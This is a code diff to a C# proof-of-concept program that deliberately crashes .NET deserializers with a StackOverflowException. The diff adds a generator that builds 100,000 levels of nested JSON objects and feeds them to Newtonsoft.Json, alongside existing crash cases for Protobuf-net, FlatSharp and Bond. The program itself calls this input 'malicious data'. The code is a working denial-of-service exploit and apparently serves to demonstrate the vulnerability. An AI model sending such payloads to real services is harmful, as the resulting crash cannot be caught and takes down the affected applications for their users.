@@ -2,9 +2,11 @@
 using Bond.IO.Safe;
 using Bond.Protocols;
 using FlatSharp;
+using Newtonsoft.Json;
 using ProtoBuf;
 using System;
 using System.Buffers;
+using System.Text;
 using System.Threading;
 
 namespace StackOverflowException
@@ -12,18 +14,20 @@ namespace StackOverflowException
     public static class Program
     {
         private const int StackSize = 100_000_000;
+        private const int NewtonsoftJsonIterations = 100_000;
         private const int ProtobufNetIterations = 100_000;
         private const int FlatSharpIterations = 300_000;
         private const int BondIterations = 200_000;
 
         public static void Main(string[] args)
         {
-            string library = args.Length > 0 ? args[0].ToLower() : "protobufnet";
+            string library = args.Length > 0 ? args[0].ToLower() : "newtonsoftjson";
 
             try
             {
                 switch (library)
                 {
+                    case "newtonsoftjson": NewtonsoftJsonCrash(); break;
                     case "protobufnet": ProtobufNetCrash(); break;
                     case "flatsharp": FlatSharpCrash(); break;
                     case "bond": BondCrash(); break;
@@ -33,6 +37,12 @@ namespace StackOverflowException
             {
                 // You can't catch StackOverflowException
             }
+        }
+
+        private static void NewtonsoftJsonCrash()
+        {
+            var data = GenerateMaliciousData(NewtonsoftJsonGenerator);
+            JsonConvert.DeserializeObject<Foo>(data);
         }
 
         private static void ProtobufNetCrash()
@@ -53,6 +63,25 @@ namespace StackOverflowException
             var buffer = new InputBuffer(data);
             var reader = new SimpleBinaryReader<InputBuffer>(buffer);
             Deserialize<Struct>.From(reader);
+        }
+
+        private static string NewtonsoftJsonGenerator()
+        {
+            var sb = new StringBuilder();
+
+            for (int i = 0; i < NewtonsoftJsonIterations; ++i)
+            {
+                sb.Append("{ \"A\": ");
+            }
+
+            sb.Append("{}");
+
+            for (int i = 0; i < NewtonsoftJsonIterations; ++i)
+            {
+                sb.Append('}');
+            }
+
+            return sb.ToString();
         }
 
         private static byte[] ProtobufNetGenerator()
@@ -102,9 +131,9 @@ namespace StackOverflowException
             return buffer.Data.ToArray();
         }
 
-        private static byte[] GenerateMaliciousData(Func<byte[]> generator)
+        private static T GenerateMaliciousData<T>(Func<T> generator)
         {
-            byte[] data = null;
+            T data = default;
             var thread = new Thread(() => data = generator(), StackSize);
 
             thread.Start();
